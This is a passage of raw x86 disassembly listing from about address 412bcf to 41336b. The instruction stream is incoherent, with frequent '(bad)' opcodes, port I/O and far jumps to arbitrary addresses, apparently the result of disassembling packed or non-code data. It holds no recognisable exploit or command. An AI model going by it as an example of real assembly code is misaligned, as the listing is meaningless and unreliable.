  412bcf:	bound  esi,QWORD PTR [edx-0x64f18daa]
  412bd5:	fisub  WORD PTR [ecx+0x50]
  412bd8:	imul   eax,ebx,0x78e7c2d2
  412bde:	int    0xb2
  412be0:	daa    
  412be1:	inc    eax
  412be2:	and    al,al
  412be4:	adc    ch,BYTE PTR ds:0x577a0e84
  412bea:	adc    ebp,DWORD PTR [ebx-0x12]
  412bed:	das    
  412bee:	(bad)  
  412bf0:	lea    edx,[esi-0x1f5ca111]
  412bf6:	mov    dl,BYTE PTR [eax]
  412bf8:	mov    bh,0x17
  412bfa:	rol    ecx,cl
  412bfc:	repz xlat BYTE PTR ds:[ebx]
  412bfe:	add    DWORD PTR [ebx+0x1f50f585],eax
  412c04:	and    BYTE PTR [ebx],bh
  412c06:	rcl    DWORD PTR [ebx],cl
  412c08:	ins    DWORD PTR es:[edi],dx
  412c09:	enter  0x829f,0xb8
  412c0d:	pop    eax
  412c0e:	bound  eax,QWORD PTR [esp+edi*2]
  412c11:	shl    BYTE PTR [esi+0x2f2e025d],0xda
  412c18:	sub    dl,dh
  412c1a:	dec    esp
  412c1b:	call   0xea034c67
  412c20:	mov    cl,0xe6
  412c22:	add    dl,BYTE PTR [eax+0x42dc3ab5]
  412c28:	sub    DWORD PTR [ecx-0x77],esi
  412c2b:	ja     0x412c46
  412c2d:	scas   eax,DWORD PTR es:[edi]
  412c2e:	fnsave [esi+0x6d]
  412c31:	cmp    al,0xd3
  412c33:	adc    BYTE PTR ds:0x77c56d2f,bl
  412c39:	pop    edx
  412c3a:	test   eax,0x73f12d75
  412c3f:	jns    0x412c92
  412c41:	test   eax,0x51c05a20
  412c46:	xchg   esp,eax
  412c47:	adc    al,0x7d
  412c49:	xchg   esp,eax
  412c4a:	cld    
  412c4b:	dec    ecx
  412c4c:	gs aad 0xf5
  412c4f:	jle    0x412c2d
  412c51:	jle    0x412ca3
  412c53:	pop    edi
  412c54:	les    eax,FWORD PTR [edi]
  412c56:	xlat   BYTE PTR ds:[ebx]
  412c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c58:	jl     0x412cbf
  412c5a:	es cmp edx,edi
  412c5d:	mov    dl,0xa8
  412c5f:	mov    esp,0xbd042e57
  412c64:	nop
  412c65:	and    eax,0x8f5f10c6
  412c6a:	inc    esi
  412c6b:	or     BYTE PTR [edx-0x4d6eb87b],cl
  412c71:	inc    edi
  412c72:	in     al,0xf
  412c74:	js     0x412caa
  412c76:	push   esp
  412c77:	jmp    0x412ce5
  412c79:	sbb    BYTE PTR [ecx-0x1c],al
  412c7c:	lds    ebp,FWORD PTR [edx-0x1c]
  412c7f:	pop    esi
  412c80:	je     0x412c03
  412c82:	outs   dx,BYTE PTR ds:[esi]
  412c83:	and    al,BYTE PTR es:[eax+edx*1-0x60bebaf3]
  412c8b:	rol    BYTE PTR [edx],0x89
  412c8e:	int3   
  412c8f:	call   0x2437:0x89eea6f7
  412c96:	addr16 mov ebx,0xdedb6a5e
  412c9c:	rcr    BYTE PTR [eax+0x44],1
  412c9f:	lock popf 
  412ca1:	into   
  412ca2:	enter  0x1a24,0x3e
  412ca6:	loope  0x412c53
  412ca8:	shl    DWORD PTR [esi],1
  412caa:	repz test eax,0x1f7f651d
  412cb0:	shl    DWORD PTR [edi],0x80
  412cb3:	xchg   esp,eax
  412cb4:	xchg   ecx,eax
  412cb5:	pop    ebp
  412cb6:	(bad)  
  412cb7:	int3   
  412cb8:	pop    edi
  412cb9:	xchg   ecx,eax
  412cba:	cmc    
  412cbb:	fild   QWORD PTR [esi-0x48]
  412cbe:	jb     0x412c5a
  412cc0:	outs   dx,DWORD PTR ds:[esi]
  412cc1:	mov    dl,0x2f
  412cc3:	lds    edi,FWORD PTR [ebp+ebp*4+0xc]
  412cc7:	outs   dx,BYTE PTR ds:[esi]
  412cc8:	rcl    BYTE PTR [eax-0x49],cl
  412ccb:	imul   ebx,DWORD PTR [edi+0x1b],0xffffff8c
  412ccf:	push   ds
  412cd0:	loopne 0x412cf4
  412cd2:	pop    ebx
  412cd3:	inc    ebp
  412cd4:	pop    edi
  412cd5:	push   cs
  412cd6:	xchg   ecx,eax
  412cd7:	mov    ecx,DWORD PTR [ebx]
  412cd9:	ins    DWORD PTR es:[edi],dx
  412cda:	cdq    
  412cdb:	xchg   esp,eax
  412cdc:	mov    al,0x51
  412cde:	mov    ch,0xb3
  412ce0:	leave  
  412ce1:	xlat   BYTE PTR ds:[ebx]
  412ce2:	out    0xfb,eax
  412ce4:	ins    DWORD PTR es:[edi],dx
  412ce5:	xor    BYTE PTR [ebp-0x74],bl
  412ce8:	call   0xf940e005
  412ced:	inc    ebp
  412cee:	adc    ebx,eax
  412cf0:	push   esi
  412cf1:	dec    BYTE PTR [edi-0x1e]
  412cf4:	and    eax,0xcd0c64d4
  412cf9:	push   0x10ca947
  412cfe:	mov    bh,0x3e
  412d00:	mov    ?,WORD PTR [eax-0x6de5804c]
  412d06:	adc    eax,0x18b3d511
  412d0b:	imul   eax,DWORD PTR [edx-0x8],0xe3337dc1
  412d12:	aad    0xb9
  412d14:	ds (bad) 
  412d17:	ror    BYTE PTR [ebp+esi*1-0x57],1
  412d1b:	fdiv   st(6),st
  412d1d:	mov    eax,0xd9f0d74b
  412d22:	sub    esi,DWORD PTR [esi-0x18]
  412d25:	enter  0xbc50,0xa1
  412d29:	lods   al,BYTE PTR ds:[esi]
  412d2a:	int3   
  412d2b:	scas   eax,DWORD PTR es:[edi]
  412d2c:	adc    bl,BYTE PTR [ebx+0x77]
  412d2f:	test   eax,0xa9cd524
  412d34:	pop    esp
  412d35:	fdivr  QWORD PTR [edi-0x7991a4f8]
  412d3b:	loopne 0x412cf7
  412d3d:	and    al,0xd
  412d3f:	jnp    0x412d08
  412d41:	scas   al,BYTE PTR es:[edi]
  412d42:	cli    
  412d43:	ins    DWORD PTR es:[edi],dx
  412d44:	fnstenv [ecx+0x2e5b6b0b]
  412d4a:	div    BYTE PTR [eax]
  412d4c:	out    dx,al
  412d4d:	push   ebx
  412d4e:	or     al,BYTE PTR [esp+esi*1]
  412d51:	int    0xbb
  412d53:	mov    ecx,ebx
  412d55:	das    
  412d56:	ins    BYTE PTR es:[edi],dx
  412d57:	inc    edi
  412d58:	hlt    
  412d59:	scas   eax,DWORD PTR es:[edi]
  412d5a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d5c:	ins    BYTE PTR es:[edi],dx
  412d5d:	add    al,0xff
  412d5f:	into   
  412d60:	lock push ebx
  412d62:	in     eax,dx
  412d63:	fmul   st,st(0)
  412d65:	(bad)  
  412d66:	fisttp QWORD PTR [esi-0x45a435a4]
  412d6c:	jmp    0xd54bc0a6
  412d71:	fadd   QWORD PTR [edx]
  412d73:	mov    edx,0xdc2ad741
  412d78:	stos   DWORD PTR es:[edi],eax
  412d79:	xchg   bl,bh
  412d7b:	or     cl,BYTE PTR ds:0x66dba5b8
  412d81:	sub    ecx,0x3d
  412d84:	fistp  DWORD PTR ds:0x5c468327
  412d8a:	sub    ebp,DWORD PTR [ebp+0x3ddf56c]
  412d90:	(bad)  
  412d91:	cmp    cl,BYTE PTR [ebx+0x60b96b5d]
  412d97:	stos   BYTE PTR es:[edi],al
  412d98:	scas   al,BYTE PTR es:[edi]
  412d99:	in     al,0xca
  412d9b:	retf   
  412d9c:	ins    BYTE PTR es:[edi],dx
  412d9d:	inc    ebx
  412d9e:	push   0x5b
  412da0:	push   esi
  412da1:	sub    ah,dh
  412da3:	gs sub eax,0xabdd3212
  412da9:	push   eax
  412daa:	sbb    DWORD PTR [ebx],ebx
  412dac:	mov    al,ds:0x54122b95
  412db1:	inc    ecx
  412db2:	nop
  412db3:	aas    
  412db4:	cli    
  412db5:	or     ah,BYTE PTR [edi+0x4e]
  412db8:	in     eax,0xbd
  412dba:	jl     0x412dea
  412dbc:	or     ch,al
  412dbe:	fisubr WORD PTR [eax+0x24]
  412dc1:	fidivr WORD PTR [esi]
  412dc3:	das    
  412dc4:	mov    edi,ecx
  412dc6:	sbb    DWORD PTR [edi+0x255b6c2c],eax
  412dcc:	aam    0x5c
  412dce:	in     eax,0x69
  412dd0:	inc    edx
  412dd1:	jmp    0xe446:0x82acd959
  412dd8:	push   eax
  412dd9:	xchg   esi,eax
  412dda:	fimul  DWORD PTR [ebp-0x2eedaa85]
  412de0:	out    dx,al
  412de1:	push   ss
  412de2:	in     eax,dx
  412de3:	call   0xe9ed8967
  412de8:	mov    eax,0x89aa3c1
  412ded:	pop    esp
  412dee:	jmp    0x8bc0:0xb4c7f1e7
  412df5:	into   
  412df6:	lea    eax,[eax-0x4f]
  412df9:	push   ebp
  412dfa:	dec    esp
  412dfb:	xchg   DWORD PTR [ebp-0x69],edi
  412dfe:	loopne 0x412e69
  412e00:	mov    esp,0x772da084
  412e05:	call   0xdd2b0f52
  412e0a:	mov    bh,0xf3
  412e0c:	idiv   DWORD PTR [edi+0x76]
  412e0f:	inc    ebx
  412e10:	mov    ebp,0x383d3e04
  412e15:	jle    0x412e6e
  412e17:	sahf   
  412e18:	and    eax,0x816dcb4d
  412e1d:	imul   eax,DWORD PTR [eax-0x5],0xbc380b3e
  412e24:	sbb    al,0xf7
  412e26:	shl    BYTE PTR [ebp+0x8],1
  412e29:	(bad)  
  412e2a:	adc    eax,0x5a287e58
  412e2f:	mov    dl,0x7
  412e31:	inc    ebp
  412e32:	and    al,0x5a
  412e34:	out    dx,al
  412e35:	and    al,bh
  412e37:	ret    0x86ec
  412e3a:	scas   eax,DWORD PTR es:[edi]
  412e3b:	jmp    DWORD PTR [esi]
  412e3d:	jb     0x412e37
  412e3f:	sbb    DWORD PTR [edi+0x43],esi
  412e42:	repnz sbb ebx,DWORD PTR fs:[ecx]
  412e46:	mov    al,ds:0x6a95500f
  412e4b:	sub    BYTE PTR [edi],bl
  412e4d:	add    al,0xbc
  412e4f:	xor    eax,0x85a0c5f3
  412e54:	lock inc esi
  412e56:	ss cli 
  412e58:	dec    ebp
  412e59:	push   ebx
  412e5a:	inc    edi
  412e5b:	or     DWORD PTR [edx],esp
  412e5d:	mov    ecx,0x575ee429
  412e62:	shl    bl,0x71
  412e65:	out    dx,eax
  412e66:	xchg   edi,eax
  412e67:	dec    eax
  412e68:	or     cl,ch
  412e6a:	xchg   DWORD PTR [edi],edi
  412e6c:	xor    ebp,ecx
  412e6e:	imul   ebp,DWORD PTR [ebx+0x4d1491fa],0x1e596eb8
  412e78:	enter  0x9a38,0xbf
  412e7c:	dec    esi
  412e7d:	dec    DWORD PTR [eax]
  412e7f:	std    
  412e80:	call   0xd26d22c7
  412e85:	sbb    BYTE PTR [edi-0x1f3ff328],bh
  412e8b:	js     0x412e39
  412e8d:	jbe    0x412e37
  412e8f:	push   ss
  412e90:	pop    DWORD PTR [ebp+0x1e79c5a]
  412e96:	stc    
  412e97:	or     eax,0xe216b6f1
  412e9c:	jmp    0x96ed31d2
  412ea1:	dec    eax
  412ea2:	clc    
  412ea3:	and    edx,DWORD PTR [esi]
  412ea5:	xor    esi,eax
  412ea7:	repnz inc ecx
  412ea9:	lock adc eax,0x5686f1f7
  412eaf:	in     eax,0x37
  412eb1:	iret   
  412eb2:	js     0x412ea3
  412eb4:	aad    0x9b
  412eb6:	pop    ecx
  412eb7:	int    0x57
  412eb9:	aad    0xa1
  412ebb:	fmulp  st(5),st
  412ebd:	add    BYTE PTR [edx-0x4f],bh
  412ec0:	fsub   DWORD PTR ds:0xf780228d
  412ec6:	dec    ebx
  412ec7:	push   0xe1fd80e5
  412ecc:	xor    BYTE PTR [ebp+0x68fc58b6],cl
  412ed2:	adc    DWORD PTR [ecx-0x79],0x52
  412ed6:	sub    al,0x19
  412ed8:	ja     0x412ee2
  412eda:	mov    BYTE PTR [edx],dh
  412edc:	cmp    al,0xbf
  412ede:	sbb    esi,edx
  412ee0:	push   ds
  412ee1:	push   0x8e6c2873
  412ee6:	jle    0x412e83
  412ee8:	mov    edx,0x566cdde4
  412eed:	sbb    DWORD PTR [ebp-0xb],edx
  412ef0:	cld    
  412ef1:	aam    0x5f
  412ef3:	mov    eax,0x6bcb3171
  412ef8:	(bad)  
  412ef9:	lock repz dec esp
  412efc:	dec    eax
  412efd:	mov    ah,0xd9
  412eff:	add    esp,DWORD PTR [edi-0x46]
  412f02:	jl     0x412ef3
  412f04:	sbb    eax,0xfb97f0e9
  412f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f0a:	fisub  DWORD PTR [ebx-0x457fbb87]
  412f10:	push   ebp
  412f11:	and    ebp,DWORD PTR [ebx+eax*4+0x42]
  412f15:	loope  0x412f35
  412f17:	and    al,ah
  412f19:	jle    0x412e9e
  412f1b:	xor    DWORD PTR [edx-0x27dcd82],ebp
  412f21:	repz js 0x412f56
  412f24:	ret    
  412f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f26:	adc    eax,0xcd2f010
  412f2b:	dec    esp
  412f2c:	loope  0x412ee0
  412f2e:	sbb    ch,ch
  412f30:	mov    ds:0x3e3b1866,eax
  412f35:	(bad)  
  412f36:	dec    esi
  412f37:	xchg   ebp,eax
  412f38:	xchg   BYTE PTR [esi-0x7b53800a],al
  412f3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f3f:	in     al,dx
  412f40:	gs xchg esi,eax
  412f42:	pop    esp
  412f43:	pusha  
  412f44:	dec    esp
  412f45:	bound  edi,QWORD PTR [ecx-0x18]
  412f48:	das    
  412f49:	add    DWORD PTR [edi-0x1d],esp
  412f4c:	in     eax,dx
  412f4d:	fild   DWORD PTR [ebp-0x4a]
  412f50:	mov    al,0x2f
  412f52:	loopne 0x412f29
  412f54:	mul    DWORD PTR [eax-0x48]
  412f57:	adc    cl,BYTE PTR [ebp+0x3a]
  412f5a:	push   ss
  412f5b:	in     eax,0x46
  412f5d:	(bad)  ds:0x1057cf26
  412f63:	push   eax
  412f64:	dec    esp
  412f65:	(bad)  
  412f66:	icebp  
  412f67:	jle    0x412f9d
  412f69:	js     0x412fd0
  412f6b:	into   
  412f6c:	pushf  
  412f6d:	(bad)  
  412f6f:	xor    BYTE PTR [edx+0x3b],0xde
  412f73:	iret   
  412f74:	fnsave [edx-0x272d293c]
  412f7a:	pusha  
  412f7b:	fistp  QWORD PTR [ebp-0x62c7498f]
  412f81:	dec    ebx
  412f82:	rol    BYTE PTR [ebx-0x468c0b58],1
  412f88:	arpl   WORD PTR [ebx],bp
  412f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f8b:	sub    BYTE PTR [edi+0x66],al
  412f8e:	(bad)  
  412f8f:	jge    0x412f6a
  412f91:	pop    ebp
  412f92:	pushf  
  412f93:	pop    edx
  412f94:	clc    
  412f95:	cdq    
  412f96:	jle    0x412fc7
  412f98:	lea    esi,[eax]
  412f9a:	fisttp QWORD PTR [esi-0x4c6309b5]
  412fa0:	popa   
  412fa1:	out    dx,al
  412fa2:	jmp    0x930628fe
  412fa7:	pusha  
  412fa8:	pop    es
  412fa9:	std    
  412faa:	addr16 jnp 0x412f61
  412fad:	dec    eax
  412fae:	adc    DWORD PTR [ebx+0x5a3ffa0],ecx
  412fb4:	add    al,0xa5
  412fb6:	int    0xf4
  412fb8:	pusha  
  412fb9:	mov    ah,0x28
  412fbb:	xchg   esp,eax
  412fbc:	mov    BYTE PTR [esi+eax*1-0x6e4cf1db],cl
  412fc3:	mov    eax,0xb36c22c1
  412fc8:	into   
  412fc9:	mov    BYTE PTR [eax+0x1c93ad6a],cl
  412fcf:	xchg   esi,eax
  412fd0:	push   ecx
  412fd1:	imul   esi,DWORD PTR [edi+0x3105d6ad],0xc
  412fd8:	add    ecx,ebp
  412fda:	ror    BYTE PTR [edx+0x501a7b8c],1
  412fe0:	out    0xe,al
  412fe2:	ret    
  412fe3:	(bad)  
  412fe5:	pop    ds
  412fe6:	dec    edi
  412fe7:	jb     0x413049
  412fe9:	sub    eax,0x21d82311
  412fee:	cld    
  412fef:	push   edx
  412ff0:	pop    ss
  412ff1:	jecxz  0x413014
  412ff3:	retf   
  412ff4:	and    eax,DWORD PTR [edx+0x28]
  412ff7:	retf   0x2ff
  412ffa:	jg     0x412fc1
  412ffc:	stos   DWORD PTR es:[edi],eax
  412ffd:	push   ds
  412ffe:	dec    ebx
  412fff:	retf   
  413000:	jnp    0x41304b
  413002:	mov    DWORD PTR [eax],ecx
  413004:	sub    BYTE PTR [edi],bh
  413006:	sbb    bh,BYTE PTR [edx]
  413008:	cmp    DWORD PTR [edx+ecx*4],ebx
  41300b:	jns    0x412fa4
  41300d:	mov    DWORD PTR [eax],esi
  41300f:	push   edi
  413010:	bound  edx,QWORD PTR [ebx]
  413012:	sbb    edx,ecx
  413014:	adc    edi,edi
  413016:	sbb    DWORD PTR [ecx+0x54263dbd],esp
  41301c:	sahf   
  41301d:	gs pop esi
  41301f:	mov    ebp,?
  413021:	xchg   DWORD PTR [eax+0x30],ebx
  413024:	mov    eax,ds:0x8515a5
  413029:	jmp    0x413059
  41302b:	sti    
  41302c:	jnp    0x41304a
  41302e:	adc    edx,esp
  413030:	ins    DWORD PTR es:[edi],dx
  413031:	push   edi
  413032:	es out dx,eax
  413034:	jno    0x4130b3
  413036:	lods   al,BYTE PTR ds:[esi]
  413037:	imul   ebx,eax,0xfffffff1
  41303a:	out    0xf8,eax
  41303c:	call   0x8952:0x5221ca1a
  413043:	(bad)  
  413044:	push   ds
  413045:	sbb    dh,BYTE PTR [edx]
  413047:	add    DWORD PTR [edx-0x12c53165],ebp
  41304d:	mov    ah,0x93
  41304f:	add    DWORD PTR [edi],edi
  413051:	dec    ebp
  413052:	dec    edx
  413053:	dec    ebp
  413054:	ret    
  413055:	scas   eax,DWORD PTR es:[edi]
  413056:	jnp    0x412ff6
  413058:	arpl   WORD PTR [esi+0xd],dx
  41305b:	xchg   ebp,eax
  41305c:	cmp    DWORD PTR [ecx-0x3],edi
  41305f:	into   
  413060:	outs   dx,BYTE PTR ds:[esi]
  413061:	and    ebx,ecx
  413063:	pop    esp
  413064:	push   edi
  413065:	push   ebp
  413066:	pop    ebp
  413067:	stc    
  413068:	and    DWORD PTR [eiz*4-0x32e1032e],esp
  41306f:	add    al,0xad
  413071:	int    0xfb
  413073:	xor    ch,cl
  413075:	sar    DWORD PTR [edx+0xe68c4b0],0x45
  41307c:	pop    ds
  41307d:	pushf  
  41307e:	scas   eax,DWORD PTR es:[edi]
  41307f:	jle    0x413031
  413081:	lods   eax,DWORD PTR ds:[esi]
  413082:	dec    edi
  413083:	mov    dl,BYTE PTR [edi]
  413085:	sbb    dl,cl
  413087:	(bad)  
  413088:	sbb    dh,BYTE PTR [edx-0x797ffae7]
  41308e:	aam    0x66
  413090:	mov    cl,0xbc
  413092:	cwde   
  413093:	push   cs
  413094:	inc    ebx
  413095:	push   edx
  413096:	sbb    eax,0xf8538a79
  41309b:	ins    DWORD PTR es:[edi],dx
  41309c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41309d:	jg     0x413021
  41309f:	mov    WORD PTR [ebx+0xe],?
  4130a2:	jmp    0x4130ab
  4130a4:	push   ds
  4130a5:	ror    DWORD PTR [eax+0x29],1
  4130a8:	cmp    eax,0x37af2ee9
  4130ad:	clc    
  4130ae:	mov    ds:0x692cfbb5,al
  4130b3:	or     BYTE PTR [eax],cl
  4130b5:	(bad)  
  4130b6:	fwait
  4130b7:	adc    eax,0x6a17c93c
  4130bc:	dec    edx
  4130bd:	add    eax,0x1b33f10e
  4130c2:	test   eax,0xbd2fa1ab
  4130c7:	test   eax,0x3609aeee
  4130cc:	cwde   
  4130cd:	and    esi,DWORD PTR [edx]
  4130cf:	es dec esi
  4130d1:	ret    0xcb7b
  4130d4:	dec    esi
  4130d5:	cmp    al,0x48
  4130d7:	sbb    al,0xb
  4130d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130da:	xor    al,0x6e
  4130dc:	mov    ds:0xf72bbb6,eax
  4130e1:	mov    dh,0xec
  4130e3:	lods   al,BYTE PTR gs:[esi]
  4130e5:	jns    0x41315c
  4130e7:	popf   
  4130e8:	stos   DWORD PTR es:[edi],eax
  4130e9:	mov    ebp,0xbe8e9660
  4130ee:	in     eax,0x4c
  4130f0:	out    0xb3,eax
  4130f2:	ja     0x41310b
  4130f4:	arpl   WORD PTR [esi*8+0x6746c39d],bx
  4130fb:	xchg   DWORD PTR [esi+eax*1],edx
  4130fe:	popf   
  4130ff:	jnp    0x4130df
  413101:	mov    al,0x7b
  413103:	jg     0x413101
  413105:	outs   dx,BYTE PTR ds:[esi]
  413106:	push   ebp
  413107:	add    BYTE PTR [ebx],cl
  413109:	out    dx,eax
  41310a:	retf   
  41310b:	in     eax,dx
  41310c:	or     DWORD PTR [esi-0x48],edi
  41310f:	stos   BYTE PTR es:[edi],al
  413110:	adc    esp,DWORD PTR [eax+eiz*1+0x1c92abf5]
  413117:	sub    eax,0xc55d4109
  41311c:	aas    
  41311d:	into   
  41311e:	xchg   ebp,eax
  41311f:	mov    edi,0xcb99b682
  413124:	cwde   
  413125:	fdivr  st,st(0)
  413127:	shl    DWORD PTR [edx+esi*4],0x3b
  41312b:	(bad)  
  41312c:	in     eax,0x19
  41312e:	pop    eax
  41312f:	cs int 0xcc
  413132:	aad    0x9d
  413134:	cli    
  413135:	sub    dh,BYTE PTR [edx+0x57]
  413138:	ret    
  413139:	aad    0xe5
  41313b:	bnd ds jmp 0xdc2027cb
  413142:	pusha  
  413143:	add    DWORD PTR [eax],eax
  413145:	bound  edi,QWORD PTR [edx+0x7a]
  413148:	pushf  
  413149:	ds mov esi,0x64399760
  41314f:	stos   BYTE PTR es:[edi],al
  413150:	xlat   BYTE PTR ds:[ebx]
  413151:	sub    eax,0xbbaba6be
  413156:	pop    ebx
  413157:	addr16 mov edx,0x59cb94e
  41315d:	sbb    dl,BYTE PTR [edx+0x1c62dc1c]
  413163:	push   ecx
  413164:	mov    esi,0x7428ae66
  413169:	xchg   esp,eax
  41316a:	out    0x27,eax
  41316c:	or     eax,0x246f9c5b
  413171:	jg     0x413133
  413173:	je     0x413193
  413175:	jae    0x4131f5
  413177:	adc    cl,dh
  413179:	dec    ebp
  41317a:	push   ss
  41317b:	xor    BYTE PTR [edi],al
  41317d:	loope  0x4131a3
  41317f:	mov    edx,0x11acdaf0
  413184:	mov    edi,0xe166c202
  413189:	push   0x223d9bd4
  41318e:	pop    eax
  41318f:	and    DWORD PTR [eax-0x6d],ebp
  413192:	and    DWORD PTR [ebp+0x2],eax
  413195:	sbb    al,0xe7
  413197:	mov    esi,0x6b848385
  41319c:	push   ss
  41319d:	into   
  41319e:	cmc    
  41319f:	mov    al,0xc3
  4131a1:	inc    ebp
  4131a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131a3:	ret    
  4131a4:	sub    eax,0xdbd6fd34
  4131a9:	xchg   edx,eax
  4131aa:	dec    ecx
  4131ab:	inc    esp
  4131ac:	jle    0x4131f1
  4131ae:	jnp    0x413151
  4131b0:	(bad)  
  4131b1:	std    
  4131b2:	and    BYTE PTR ds:0x41b00178,0x7a
  4131b9:	into   
  4131ba:	cdq    
  4131bb:	gs lahf 
  4131bd:	stos   DWORD PTR es:[edi],eax
  4131be:	sub    BYTE PTR [ebp-0x27148981],dl
  4131c4:	mov    esi,0x28fff062
  4131c9:	mov    dl,0x80
  4131cb:	or     DWORD PTR [edi+eiz*1+0x60],esi
  4131cf:	dec    ebx
  4131d0:	ss test al,0x59
  4131d3:	jl     0x4131af
  4131d5:	xor    al,ch
  4131d7:	adc    cl,dl
  4131d9:	lds    edx,FWORD PTR [edi]
  4131db:	jle    0x41317c
  4131dd:	adc    DWORD PTR [ecx+ecx*8+0x78],ecx
  4131e1:	fs sbb eax,0x3713fb6e
  4131e7:	cmp    cl,BYTE PTR [ebp+0x10]
  4131ea:	xchg   esp,eax
  4131eb:	daa    
  4131ec:	xchg   DWORD PTR [ebx],esi
  4131ee:	ja     0x4131b3
  4131f0:	push   0x62
  4131f2:	inc    ebx
  4131f3:	mov    ecx,0x692690bb
  4131f8:	dec    eax
  4131f9:	push   0xffffffea
  4131fb:	mov    al,0x2d
  4131fd:	retf   
  4131fe:	adc    BYTE PTR [ebp+esi*2-0x5f],al
  413202:	sbb    esi,DWORD PTR [ecx+0x63]
  413205:	inc    edi
  413206:	mov    eax,0x268aa1e
  41320b:	dec    ebx
  41320c:	add    ebp,DWORD PTR [eax]
  41320e:	and    eax,0x35913662
  413213:	mov    eax,0x10ea0def
  413218:	cwde   
  413219:	mov    ah,0xcf
  41321b:	sbb    bh,BYTE PTR [edx]
  41321d:	in     eax,dx
  41321e:	mov    eax,ds:0x567bfd94
  413223:	es test eax,0x22ab5ce4
  413229:	retf   0x7532
  41322c:	fwait
  41322d:	jmp    0x4131c0
  41322f:	ja     0x41328d
  413231:	pop    edi
  413232:	aaa    
  413233:	dec    ebx
  413234:	mov    eax,ds:0x53cff979
  413239:	loop   0x4132ab
  41323b:	adc    BYTE PTR [ebx+0x4879056f],ch
  413241:	sub    ah,BYTE PTR [ecx-0x6c]
  413244:	inc    ebx
  413245:	or     dl,BYTE PTR [esi-0x2f]
  413248:	or     eax,0x4f603798
  41324d:	xchg   edx,eax
  41324e:	std    
  41324f:	xchg   ecx,eax
  413250:	pop    esp
  413251:	xchg   ebx,eax
  413252:	in     eax,dx
  413253:	jbe    0x413202
  413255:	mov    dl,0x1
  413257:	jecxz  0x4132a5
  413259:	in     eax,dx
  41325a:	lods   eax,DWORD PTR ds:[esi]
  41325b:	call   0x91c5:0x2322fa87
  413262:	sbb    dh,dl
  413264:	mov    ah,0x22
  413266:	(bad)  
  413267:	cmp    al,0xf3
  413269:	xchg   ecx,eax
  41326a:	xor    ch,BYTE PTR [edx-0x5d]
  41326d:	in     eax,0xc9
  41326f:	add    al,0xa7
  413271:	sbb    DWORD PTR [edi],ebp
  413273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413274:	pop    ebp
  413275:	dec    eax
  413276:	ins    DWORD PTR es:[edi],dx
  413277:	rcr    BYTE PTR [edx+0x37],0xcc
  41327b:	pusha  
  41327c:	cmc    
  41327d:	ja     0x4132db
  41327f:	scas   al,BYTE PTR es:[edi]
  413280:	pop    ss
  413281:	push   es
  413282:	ret    
  413283:	shl    BYTE PTR [eax+0x43ed17a0],cl
  413289:	push   ebp
  41328a:	lea    ebx,[eax+0x22c426b1]
  413290:	cmp    ebx,DWORD PTR [ebx+ebp*4-0x723166eb]
  413297:	xchg   ebp,eax
  413298:	daa    
  413299:	jbe    0x413221
  41329b:	or     BYTE PTR [edx-0x7d9ef538],ah
  4132a1:	push   es
  4132a2:	test   BYTE PTR [ecx-0x7e896a7],dl
  4132a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132a9:	(bad)  
  4132aa:	imul   esp,DWORD PTR [ecx-0xf3ef507],0x11
  4132b1:	aas    
  4132b2:	sub    eax,DWORD PTR [eax-0x3f5129ec]
  4132b8:	loop   0x413268
  4132ba:	inc    ecx
  4132bb:	sub    edi,DWORD PTR [ebx]
  4132bd:	ss jnp 0x4132f6
  4132c0:	sub    al,0xbb
  4132c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132c3:	dec    edx
  4132c4:	sub    bh,dh
  4132c6:	pop    ebx
  4132c7:	jne    0x413322
  4132c9:	ret    
  4132ca:	fst    DWORD PTR [ebp+0x22c904a6]
  4132d0:	sbb    eax,0x7c6c50f9
  4132d5:	sbb    BYTE PTR [edx],dh
  4132d7:	jp     0x413278
  4132d9:	ins    BYTE PTR es:[edi],dx
  4132da:	mov    ch,0x28
  4132dc:	rcr    BYTE PTR [ecx-0x1c],1
  4132df:	lahf   
  4132e0:	push   eax
  4132e1:	std    
  4132e2:	scas   eax,DWORD PTR es:[edi]
  4132e3:	int3   
  4132e4:	push   ecx
  4132e5:	sub    DWORD PTR [ebx+0x2e30b75e],esp
  4132eb:	inc    eax
  4132ec:	les    edi,FWORD PTR [ebx+0xe]
  4132ef:	out    dx,al
  4132f0:	das    
  4132f1:	sub    DWORD PTR [ecx+0x6996eb04],0x4c1271d5
  4132fb:	jmp    0x6326:0x2a908f1
  413302:	lahf   
  413303:	dec    esp
  413304:	or     ecx,DWORD PTR [edx-0x27]
  413307:	lods   al,BYTE PTR ds:[esi]
  413308:	arpl   WORD PTR [edx],dx
  41330a:	mov    al,ds:0xb7f279ef
  41330f:	and    BYTE PTR [ebx-0x76be26b4],al
  413315:	pop    esi
  413316:	xchg   ebp,eax
  413317:	cwde   
  413318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413319:	test   ebx,esi
  41331b:	mov    ecx,0xcecbd52
  413320:	cmpxchg esp,eax
  413323:	sbb    ebp,DWORD PTR [edx-0x7b57950e]
  413329:	push   edi
  41332a:	push   ecx
  41332b:	mov    ds:0x7cb833f8,al
  413330:	pop    ecx
  413331:	rcl    cl,cl
  413333:	mov    ecx,0xafbc059f
  413338:	into   
  413339:	mov    esp,0xbb409a58
  41333e:	add    BYTE PTR fs:[esi+0x7c],0x79
  413343:	xchg   DWORD PTR [edx],ecx
  413345:	pop    ecx
  413346:	ret    0xac50
  413349:	fisttp DWORD PTR [ebp+0x7f8cb76d]
  41334f:	push   es
  413350:	cmp    eax,0x3a241144
  413355:	and    dl,BYTE PTR [ecx+0x31b285f]
  41335b:	lds    ebx,FWORD PTR [ebx]
  41335d:	cmp    dl,BYTE PTR [edx+0x56aad0f5]
  413363:	xchg   edx,eax
  413364:	les    ecx,FWORD PTR [esi+0x65]
  413367:	aam    0xa1
  413369:	or     edx,DWORD PTR [ebx]
  41336b:	pushf  
